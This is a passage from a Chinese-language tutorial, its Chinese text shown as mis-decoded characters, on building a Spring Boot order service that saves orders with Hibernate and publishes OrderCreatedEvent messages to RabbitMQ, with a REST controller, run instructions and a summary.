<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RabbitTemplate rabbitTemplate;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderRepository orderRepository;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderService</span><span class="hljs-params">(RabbitTemplate rabbitTemplate, OrderRepository orderRepository)</span> {
        <span class="hljs-built_in">this</span>.rabbitTemplate = rabbitTemplate;
        <span class="hljs-built_in">this</span>.orderRepository = orderRepository;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">savedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);

        <span class="hljs-comment">// Publish event</span>
        <span class="hljs-type">OrderCreatedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>();
        event.setOrderId(savedOrder.getId());
        event.setProduct(savedOrder.getProduct());
        event.setQuantity(savedOrder.getQuantity());
        event.setPrice(savedOrder.getPrice());
        rabbitTemplate.convertAndSend(<span class="hljs-string">"orderQueue"</span>, event);

        <span class="hljs-keyword">return</span> savedOrder;
    }
}
</code></pre>
<h3 data-id="heading-12">7. åˆ›å»ºæ§åˆ¶å™¨</h3>
<h4 data-id="heading-13"><code>OrderController.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderService.createOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.getOrderById(id);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(order);
    }

    <span class="hljs-meta">@GetMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;List&lt;Order&gt;&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        List&lt;Order&gt; orders = orderService.getAllOrders();
        <span class="hljs-keyword">return</span> ResponseEntity.ok(orders);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> Order order)</span> {
        order.setId(id); <span class="hljs-comment">// Ensure the order ID is set correctly</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderService.updateOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(updatedOrder);
    }

    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Void&gt; <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        orderService.deleteOrder(id);
        <span class="hljs-keyword">return</span> ResponseEntity.noContent().build();
    }
}
</code></pre>
<h3 data-id="heading-14">8. è¿è¡Œåº”ç”¨</h3>
<ol>
<li><strong>å¯åŠ¨RabbitMQ</strong>ï¼šç¡®ä¿ä½ çš„RabbitMQæœåŠ¡å™¨è¿è¡Œåœ¨<code>localhost:5672</code>ã€‚</li>
<li><strong>å¯åŠ¨Spring Bootåº”ç”¨</strong>ï¼šè¿è¡ŒSpring Bootåº”ç”¨ç¨‹åºã€‚</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">mvn spring-boot:run
</code></pre>
<h3 data-id="heading-15">9. è®¿é—®API</h3>
<p>é€šè¿‡ä»¥ä¸‹APIè®¿é—®<code>Order</code>æ•°æ®ï¼š</p>
<ul>
<li><code>POST /orders</code>ï¼šåˆ›å»ºOrderã€‚</li>
<li><code>GET /orders/{id}</code>ï¼šæŒ‰IDè·å–Orderã€‚</li>
<li><code>GET /orders</code>ï¼šè·å–æ‰€æœ‰Ordersã€‚</li>
<li><code>PUT /orders/{id}</code>ï¼šæ›´æ–°Orderã€‚</li>
<li><code>DELETE /orders/{id}</code>ï¼šåˆ é™¤Orderã€‚</li>
</ul>
<h3 data-id="heading-16">æ€»ç»“</h3>
<p>é€šè¿‡ä¸Šè¿°æ­¥éª¤ï¼Œæˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ä½¿ç”¨Hibernateï¼ŒåŒ…æ‹¬é…ç½®Hibernateå’Œæ•°æ®æºã€å®šä¹‰å®ä½“å’ŒDAOå±‚ã€é…ç½®RabbitMQã€åˆ›å»ºäº‹ä»¶å’Œäº‹ä»¶å¤„ç†å™¨ã€å‘å¸ƒå’Œå¤„ç†äº‹ä»¶ï¼Œä»¥åŠä½¿ç”¨æ§åˆ¶å™¨è®¿é—®APIã€‚åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ï¼Œäº‹ä»¶è§¦å‘å™¨å’Œäº‹ä»¶å¤„ç†å™¨ä¹‹é—´çš„æ¾æ•£è€¦åˆå¯ä»¥æé«˜ç³»ç»Ÿçš„å¯æ‰©å±•æ€§å’Œçµæ´»æ€§ï¼ŒåŒæ—¶é€šè¿‡ä½¿ç”¨Hibernateç¡®ä¿æ•°æ®æŒä¹…æ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>